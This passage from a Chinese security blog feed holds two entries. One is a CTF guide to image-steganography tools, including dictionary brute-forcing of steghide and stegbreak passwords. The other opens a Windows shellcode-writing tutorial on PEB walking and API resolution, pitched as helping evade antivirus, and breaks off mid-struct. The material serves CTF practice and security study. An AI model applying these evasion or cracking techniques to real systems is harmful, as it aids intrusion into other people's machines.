        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>懒狗今天决定整理一下图片隐写上的一些工具<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2608330498.png" alt="我可没辣么简单.png"></p><h2 id="1-F5-steganography"><a href="#1-F5-steganography" class="headerlink" title="1.F5-steganography"></a>1.F5-steganography</h2><p>一款F5隐写工具（kali）（PS：需要密码）</p><p>kali安装命令（也可直接下载）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;matthewgao&#x2F;F5-steganography</span><br></pre></td></tr></table></figure><p>加密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java Embed 原图.jpg 生成图.jpg -e 隐藏的文件.txt -p &#39;密码&#39;</span><br></pre></td></tr></table></figure><p>解密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java Extract 生成图.jpg -p &#39;密码&#39;</span><br></pre></td></tr></table></figure><p>举个栗子吧~</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2261313197.png" alt="img"></p><h2 id="2-steghide"><a href="#2-steghide" class="headerlink" title="2.steghide"></a>2.steghide</h2><p>Steghide是一种隐写程序，能够隐藏各种图像和音频文件中的数据。颜色方面的样本频率不会更改，因此使嵌入抗一阶统计检验。</p><h3 id="Windows下"><a href="#Windows下" class="headerlink" title="Windows下"></a><strong>Windows下</strong></h3><p>官网下载地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;steghide.sourceforge.net&#x2F;download.php</span><br></pre></td></tr></table></figure><p>加密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steghide embed -cf .\原图.jpg -ef 隐藏的文件.txt</span><br><span class="line">然后还要输入密码，确认密码</span><br></pre></td></tr></table></figure><p>解密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -p &#39;密码&#39; -sf .\生成图.jpg</span><br><span class="line">输入 y 确认</span><br></pre></td></tr></table></figure><p>举个栗子吧~</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3150814007.png" alt="img"></p><h3 id="Linux-kali下"><a href="#Linux-kali下" class="headerlink" title="Linux-kali下"></a><strong>Linux-kali下</strong></h3><p>（PS：本人用的是win下的，以下过程皆来自网络.jpg）<br>安装命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install stegdetect</span><br></pre></td></tr></table></figure><p>加密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将 隐藏的文件.txt 文件隐藏到 原图.jpg 中</span><br><span class="line">steghide embed -cf 原图.jpg -ef 隐藏的文件.txt [-p 密码]</span><br></pre></td></tr></table></figure><p>解密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看图片中嵌入的文件信息</span><br><span class="line">steghide info 生成图.jpg</span><br><span class="line">提取含有密码的隐藏内容</span><br><span class="line">steghide extract -sf 生成图.jpg -p 密码</span><br><span class="line">提取不含有密码的隐藏内容</span><br><span class="line">steghide extract -sf 生成图.jpg</span><br></pre></td></tr></table></figure><p>steghide爆破密码：</p><blockquote><p>有些题目用steghide加密文件但是不给密码，此时就需要爆破，steghide本身并不支持爆破，需要一些其他的方法：<a href="https://github.com/Va5c0/Steghide-Brute-Force-Tool">https://github.com/Va5c0/Steghide-Brute-Force-Tool</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">需要安装的库：progressbar</span><br><span class="line">pip install progressbar2</span><br><span class="line">python steg_brute.py -b -d [字典] -f [jpg_file]</span><br></pre></td></tr></table></figure><h2 id="3-outguess"><a href="#3-outguess" class="headerlink" title="3.outguess"></a>3.outguess</h2><p>OutGuess是一种通用的隐写工具，允许插入隐藏信息到数据源的冗余位中。</p><p>kali安装命令（也可直接下载）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;crorvick&#x2F;outguess</span><br><span class="line">cd outguess的目录</span><br><span class="line">接着一个小技巧，先切换到root权限（因为我是kali2020）</span><br><span class="line">sudo su</span><br><span class="line">输入密码</span><br><span class="line">.&#x2F;configure &amp;&amp; make &amp;&amp; make install</span><br><span class="line">因为make就是sudo了，但是make install就不是sudo了</span><br></pre></td></tr></table></figure><p>加密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">输入密码</span><br><span class="line">outguess -k 密码 -d 隐藏的文件.txt 生成图.jpg 原图.jpg</span><br></pre></td></tr></table></figure><p>解密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">输入密码</span><br><span class="line">outguess -k &quot;密码&quot; -r 生成图.jpg 隐藏的文件.txt</span><br></pre></td></tr></table></figure><p>举个栗子吧~</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1235280654.png" alt="img"></p><h2 id="4-Jphswin"><a href="#4-Jphswin" class="headerlink" title="4.Jphswin"></a>4.Jphswin</h2><p>一款图形化界面的JPHS隐写工具<br><a href="https://pan.baidu.com/s/1n8rGiHew6U9bxoSAMTT7_w">下载地址</a>（提取码：n9ao）<br>导入图片，加密就点hide输入密码（也可不用密码）然后save一下就好了，解密就点seek输入密码（也可能没密码）<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3530729664.png" alt="img"></p><h2 id="5-Stegsolve"><a href="#5-Stegsolve" class="headerlink" title="5.Stegsolve"></a>5.Stegsolve</h2><p>一款ctf中常用的图形化工具，需要安装java环境<br><a href="https://pan.baidu.com/s/1gWTGmsVxiBntGSWw0eZquw">下载地址</a>（提取码：mx09）</p><p> <img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2462665452.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2115724581.png" alt="img"></p><blockquote><p>1.File Format：文件格式，这里你会看见图片的具体信息有时候有些图片隐写的flag会藏在这里<br>2.<strong>Data Extract</strong>：数据提取即抽取图片中隐藏数据，这个应该是特别常用的模块，具体大家去百度/Google吧（我也讲不清楚.jpg）<br>3.Steregram Solve：立体图解决，可以左右控制偏移，可以放张图片试一下就知道这个是什么意思了<br>4.Frame Browser：帧浏览器，主要是对GIF之类的动图进行分解，把动图一帧帧的放，好像可以保存下来<br>5.Image Combiner：图像合成器也就是拼图/图片拼接</p></blockquote><p><a href="https://www.cnblogs.com/cat47/p/11483478.html">stegsolve使用方法的文章</a></p><h2 id="6-Zsteg"><a href="#6-Zsteg" class="headerlink" title="6.Zsteg"></a>6.Zsteg</h2><p>kali安装命令（也可直接下载）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;zed-0xff&#x2F;zsteg</span><br><span class="line">cd zsteg&#x2F;</span><br><span class="line">gem install zsteg</span><br></pre></td></tr></table></figure><p>用法（lsb隐写）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zsteg -a XXX.png &#x2F; zsteg -a XXX.bmp</span><br><span class="line">zsteg -e &quot;b1,rgb,lsb,xy&quot; XXX.png &gt; XXX.zip</span><br></pre></td></tr></table></figure><p>回顾赛题byDASCTF2020-7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zsteg red_blue.png</span><br><span class="line">zsteg red_blue.png -e &#39;b1,r,lsb,xy&#39; &gt; pass.png</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2160594035.png" alt="img"></p><h2 id="7-stegdetect"><a href="#7-stegdetect" class="headerlink" title="7.stegdetect"></a>7.stegdetect</h2><p>Stegdetect主要用于分析JPEG文件，可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息（PS：我没用过）<br>Stegdetect通过统计测试来分析图像文件中是否包含隐藏内容；运行静态测试以判断隐藏的内容是否存在；尝试识别隐藏内容是通过哪个隐写工具嵌入的。</p><p>kali安装命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install stegdetect</span><br></pre></td></tr></table></figure><p>食用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">将图片复制到 stegdetect.exe 所在文件夹，打开 cmd 输入：</span><br><span class="line">stegdetect.exe -tjopi -s 10.0 [stego_file]</span><br><span class="line"></span><br><span class="line">-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</span><br><span class="line">-t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：</span><br><span class="line">j 检测图像中的信息是否是用jsteg嵌入的。</span><br><span class="line">o 检测图像中的信息是否是用outguess嵌入的。</span><br><span class="line">p 检测图像中的信息是否是用jphide嵌入的。</span><br><span class="line">i 检测图像中的信息是否是用invisible secrets嵌入的。</span><br><span class="line"></span><br><span class="line">如果显示为 [stego_file]：jphide(***)，则可以用 stegbreak 破解密码</span><br><span class="line">stegbreak -r rules.ini -f password.txt -t p [stego_file]</span><br><span class="line"># password.txt为自带字典</span><br><span class="line">Loaded 1 files...</span><br><span class="line">[stego_file]：jphide[v5](2333)</span><br><span class="line"># 2333为该文件jphide的密码</span><br></pre></td></tr></table></figure><blockquote><p>参考文章：<br><a href="https://www.kancloud.cn/wintry/kali-linux/784110">https://www.kancloud.cn/wintry/kali-linux/784110</a><br><a href="http://www.ga1axy.top/index.php/archives/6/#stegdetect%EF%BC%88%E6%A3%80%E6%9F%A5jpg%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%96%B9%E6%B3%95win%EF%BC%89">http://www.ga1axy.top/index.php/archives/6/#stegdetect%EF%BC%88%E6%A3%80%E6%9F%A5jpg%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%96%B9%E6%B3%95win%EF%BC%89</a></p></blockquote><h2 id="8-BlindWaterMark"><a href="#8-BlindWaterMark" class="headerlink" title="8.BlindWaterMark"></a>8.BlindWaterMark</h2><p>盲水印脚本-python<br>下载地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;chishaxie&#x2F;BlindWaterMark</span><br></pre></td></tr></table></figure><p>使用前需要安装模块：cv2、matplotlib</p><p>合成盲水印图</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python bwm.py encode hui.png wm.png hui_with_wm.png</span><br></pre></td></tr></table></figure><p>提取图中的盲水印 (需要原图)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python bwm.py decode hui.png hui_with_wm.png wm_from_hui.png</span><br></pre></td></tr></table></figure><h3 id="频域盲水印"><a href="#频域盲水印" class="headerlink" title="频域盲水印"></a>频域盲水印</h3><p>如果上面那个bwm不行可以试试这个</p><p>附上脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">from argparse import ArgumentParser</span><br><span class="line"></span><br><span class="line">ALPHA &#x3D; 5</span><br><span class="line"></span><br><span class="line">def build_parser():</span><br><span class="line">    parser &#x3D; ArgumentParser()</span><br><span class="line">    parser.add_argument(&#39;--original&#39;, dest&#x3D;&#39;ori&#39;, required&#x3D;True)</span><br><span class="line">    parser.add_argument(&#39;--image&#39;, dest&#x3D;&#39;img&#39;, required&#x3D;True)</span><br><span class="line">    parser.add_argument(&#39;--result&#39;, dest&#x3D;&#39;res&#39;, required&#x3D;True)</span><br><span class="line">    parser.add_argument(&#39;--alpha&#39;, dest&#x3D;&#39;alpha&#39;, default&#x3D;ALPHA)</span><br><span class="line">    return parser</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser &#x3D; build_parser()</span><br><span class="line">    options &#x3D; parser.parse_args()</span><br><span class="line">    ori &#x3D; options.ori</span><br><span class="line">    img &#x3D; options.img</span><br><span class="line">    res &#x3D; options.res</span><br><span class="line">    alpha &#x3D; options.alpha</span><br><span class="line">    if not os.path.isfile(ori):</span><br><span class="line">        parser.error(&quot;original image %s does not exist.&quot; % ori)</span><br><span class="line">    if not os.path.isfile(img):</span><br><span class="line">        parser.error(&quot;image %s does not exist.&quot; % img)</span><br><span class="line">    decode(ori, img, res, alpha)</span><br><span class="line"></span><br><span class="line">def decode(ori_path, img_path, res_path, alpha):</span><br><span class="line">    ori &#x3D; cv2.imread(ori_path)</span><br><span class="line">    img &#x3D; cv2.imread(img_path)</span><br><span class="line">    ori_f &#x3D; np.fft.fft2(ori)</span><br><span class="line">    img_f &#x3D; np.fft.fft2(img)</span><br><span class="line">    height, width &#x3D; ori.shape[0], ori.shape[1]</span><br><span class="line">    watermark &#x3D; (ori_f - img_f) &#x2F; alpha</span><br><span class="line">    watermark &#x3D; np.real(watermark)</span><br><span class="line">    res &#x3D; np.zeros(watermark.shape)</span><br><span class="line">    random.seed(height + width)</span><br><span class="line">    x &#x3D; range(height &#x2F; 2)</span><br><span class="line">    y &#x3D; range(width)</span><br><span class="line">    random.shuffle(x)</span><br><span class="line">    random.shuffle(y)</span><br><span class="line">    for i in range(height &#x2F; 2):</span><br><span class="line">        for j in range(width):</span><br><span class="line">            res[x[i]][y[j]] &#x3D; watermark[i][j]</span><br><span class="line">    cv2.imwrite(res_path, res, [int(cv2.IMWRITE_JPEG_QUALITY), 100])</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>食用方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pinyubwm.py --original 1.png --image 2.png --result out.png</span><br></pre></td></tr></table></figure><h3 id="Java盲水印"><a href="#Java盲水印" class="headerlink" title="Java盲水印"></a>Java盲水印</h3><p> <a href="https://pan.baidu.com/s/1_96MvGgpUQ0PcJTfrvXzlw">下载地址</a>（提取码：3al9）</p><p>食用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">加文字水印:</span><br><span class="line">java -jar BlindWatermark-v0.0.3-windows-x86_64.jar encode -ct 原图.png 文字 生成图.jpg</span><br><span class="line"></span><br><span class="line">文字水印解码:</span><br><span class="line">java -jar BlindWatermark-v0.0.3-windows-x86_64.jar decode -c 生成图.jpg 解码得到的水印图.jpg</span><br><span class="line"></span><br><span class="line">加图片水印:</span><br><span class="line">java -jar BlindWatermark-v0.0.3-windows-x86_64.jar encode -ci 原图.png 水印图.png 生成图.jpg</span><br><span class="line"></span><br><span class="line">图片水印解码:</span><br><span class="line">java -jar BlindWatermark-v0.0.3-windows-x86_64.jar decode -c 生成图.jpg 解码得到的水印图.jpg</span><br></pre></td></tr></table></figure><h2 id="9-silenteye隐写"><a href="#9-silenteye隐写" class="headerlink" title="9.silenteye隐写"></a>9.silenteye隐写</h2><p><a href="https://pan.baidu.com/s/1eaXYeb2tad5ApIEDYmdwhQ#list/path=%2F">下载地址</a>（提取码：qph2）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4266773398.png" alt="img"></p><p>这不是音频隐写么？竟也有图片隐写用的上他<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3538984511.png" alt="img"></p><p>待续…</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellcode编写指南</title>
      <link href="2021/02/24/shellcode%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/"/>
      <url>2021/02/24/shellcode%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>linux的shellcode就不用说了，直接通过一个int 0x80系统调用，指定想调用的函数的系统调用号（syscall），传入调用函数的参数，即可，懂的都懂。</p><p>在windows中，没有像int 0x80系统调用功能来找相应的函数，但是也有syscall这样的系统调用，过AV奇效，这里主要介绍的是如何手动去通过GetProcAddress去查找某个函数的地址，然后进行调用，这里需要一丢丢c基础和汇编基础。</p><h1 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h1><p>在windows中，我们需要如下步骤去找到相应的函数，进行调用：</p><blockquote><p>1）找到PEB表，获取Kernel32.dll base地址<br>2)通过kernel32.dll PE文件格式找到导出表的地址<br>3)通过导出表定位GetProcAddress的RVA<br>4）通过GetProcAddress函数找到LoadLibraryA函数地址<br>5）通过这GetProcAddress和LoadLibraryA两个函数来加载dll文件和查找函数以供使用</p></blockquote><p>先了解几个基本概念，api函数，动态链接库文件。</p><h2 id="2-1-kernel32-dll"><a href="#2-1-kernel32-dll" class="headerlink" title="2.1 kernel32.dll"></a>2.1 kernel32.dll</h2><p>定义：kernel32.dll是windows中非常重要的32位动态链接库文件，工作在ringo，属于内核级文件，它控制着系统的内存管理、数据的输入输出操作和中断处理，当Windows启动时，kernel32.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域，提供了954个可供调用api。</p><p>$$ 2.2 GetProcAddress</p><p>定义：GetProcAddress是一个计算机函数，功能是检索指定的动态链接库(DLL)中的输出库函数地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FARPROC GetProcAddress(</span><br><span class="line">HMODULE hModule, &#x2F;&#x2F; DLL模块句柄，可通过LoadLibrary、AfxLoadLibrary 或者GetModuleHandle函数返回此句柄。</span><br><span class="line">LPCSTR lpProcName &#x2F;&#x2F; 函数名</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>如果函数查找成功，返回值是DLL中的输出函数地址，如果函数调用失败，返回值是NULL</p><p>动态链接库DLL的进程会调用GetProcAddress来获取DLL中导出函数的地址。</p><h2 id="2-3-LoadLibrary"><a href="#2-3-LoadLibrary" class="headerlink" title="2.3 LoadLibrary"></a>2.3 LoadLibrary</h2><p>将指定的模块加载到调用进程的地址空间中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HMODULE LoadLibraryA(  LPCSTR lpLibFileName );&#x2F;&#x2F;模块的名称，可以是库模块（.dll文件）或可执行模块（.exe文件）。</span><br></pre></td></tr></table></figure><p>如果函数成功，则返回值是模块的句柄，如果函数失败，则返回值为NULL。</p><h2 id="2-4-PE文件格式"><a href="#2-4-PE文件格式" class="headerlink" title="2.4 PE文件格式"></a>2.4 PE文件格式</h2><p>PE文件的全称是Portable Executable，意为可移植的可执行的文件，常见的EXE、DLL、OCX、SYS、COM都是PE文件</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2516431772.png"></p><p>不多讲了，一张图就行，PE文件格式内容要说多，专门有一本书来讲PE文件结构，要说简单，一张图就能概括，如果不是为了去写壳，脱壳…….根本不需要知道那么多。</p><h2 id="2-5-PEB"><a href="#2-5-PEB" class="headerlink" title="2.5 PEB"></a>2.5 PEB</h2><p>在Windows操作系统中，PEB是一个位于所有进程内存中固定位置的结构体,此结构体包含关于进程的有用信息，如可执行文件加载到内存的位置，模块列表（DLL），指示进程是否被调试的标志，还有许多其他的信息。</p><p>微软定义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _PEB &#123;</span><br><span class="line">  BYTE                          Reserved1[2];</span><br><span class="line">  BYTE                          BeingDebugged;</span><br><span class="line">  BYTE                          Reserved2[1];</span><br><span class="line">  PVOID                         Reserved3[2];</span><br><span class="line">  PPEB_LDR_DATA                 Ldr;&#x2F;&#x2F;偏移4+2*4</span><br><span class="line">  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;</span><br><span class="line">  PVOID                         Reserved4[3];</span><br><span class="line">  PVOID                         AtlThunkSListPtr;</span><br><span class="line">  PVOID                         Reserved5;</span><br><span class="line">  ULONG                         Reserved6;</span><br><span class="line">  PVOID                         Reserved7;</span><br><span class="line">  ULONG                         Reserved8;</span><br><span class="line">  ULONG                         AtlThunkSListPtr32;</span><br><span class="line">  PVOID                         Reserved9[45];</span><br><span class="line">  BYTE                          Reserved10[96];</span><br><span class="line">  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">  BYTE                          Reserved11[128];</span><br><span class="line">  PVOID                         Reserved12[1];</span><br><span class="line">  ULONG                         SessionId;</span><br><span class="line">&#125; PEB, *PPEB;</span><br></pre></td></tr></table></figure><p>在64位上的定义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _PEB &#123;</span><br><span class="line">    BYTE Reserved1[2];</span><br><span class="line">    BYTE BeingDebugged;</span><br><span class="line">    BYTE Reserved2[21];</span><br><span class="line">    PPEB_LDR_DATA LoaderData;</span><br><span class="line">    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;</span><br><span class="line">    BYTE Reserved3[520];</span><br><span class="line">    PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">    BYTE Reserved4[136];</span><br><span class="line">    ULONG SessionId;</span><br><span class="line">&#125; PEB;</span><br></pre></td></tr></table></figure><p>我们重点关注结构体PEB_LDR_DATA里面的内容，包含如下信息(该结构包含有关进程的已加载模块的信息)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _PEB_LDR_DATA &#123;</span><br><span class="line">  BYTE       Reserved1[8];&#x2F;&#x2F;保留供操作系统内部使用。</span><br><span class="line">  PVOID      Reserved2[3];&#x2F;&#x2F;保留供操作系统内部使用</span><br><span class="line">  LIST_ENTRY InMemoryOrderModuleList;&#x2F;&#x2F;双向链接列表的头部，该列表包含该过程的已加载模块。列表中的每个项目都是指向LDR_DATA_TABLE_ENTRY结构的指针,偏移为8+3x4</span><br><span class="line">&#125; PEB_LDR_DATA, *PPEB_LDR_DATA;</span><br></pre></td></tr></table></figure><p>LIST_ENTRY结构是一个简单的双向链表，包含指向下一个元素（Flink）的指针和指向上一个元素的指针（Blink）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _LIST_ENTRY &#123;</span><br><span class="line">   struct _LIST_ENTRY *Flink;</span><br><span class="line">   struct _LIST_ENTRY *Blink;</span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br></pre></td></tr></table></figure><p>我们需要通过LDR_DATA_TABLE_ENTRY结构体来获取已加载DLL的信息结构体为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _LDR_DATA_TABLE_ENTRY</span><br><span class="line">&#123;</span><br><span class="line">    LIST_ENTRY InLoadOrderLinks; &#x2F;* 0x00 *&#x2F;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks; &#x2F;* 0x08，这里是Flink指向的地方 *&#x2F; </span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks; &#x2F;* 0x10 *&#x2F;</span><br><span class="line">    PVOID DllBase; &#x2F;* 0x18 *&#x2F;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName; &#x2F;* 0x24 *&#x2F;</span><br><span class="line">    UNICODE_STRING BaseDllName; &#x2F;* 0x28 *&#x2F;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    WORD LoadCount;</span><br><span class="line">    WORD TlsIndex;</span><br><span class="line">    union</span><br><span class="line">    &#123;</span><br><span class="line">         LIST_ENTRY HashLinks;</span><br><span class="line">         struct</span><br><span class="line">         &#123;</span><br><span class="line">              PVOID SectionPointer;</span><br><span class="line">              ULONG CheckSum;</span><br><span class="line">         &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    union</span><br><span class="line">    &#123;</span><br><span class="line">         ULONG TimeDateStamp;</span><br><span class="line">         PVOID LoadedImports;</span><br><span class="line">    &#125;;</span><br><span class="line">    _ACTIVATION_CONTEXT * EntryPointActivationContext;</span><br><span class="line">    PVOID PatchInformation;</span><br><span class="line">    LIST_ENTRY ForwarderLinks;</span><br><span class="line">    LIST_ENTRY ServiceTagLinks;</span><br><span class="line">    LIST_ENTRY StaticLinks;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, 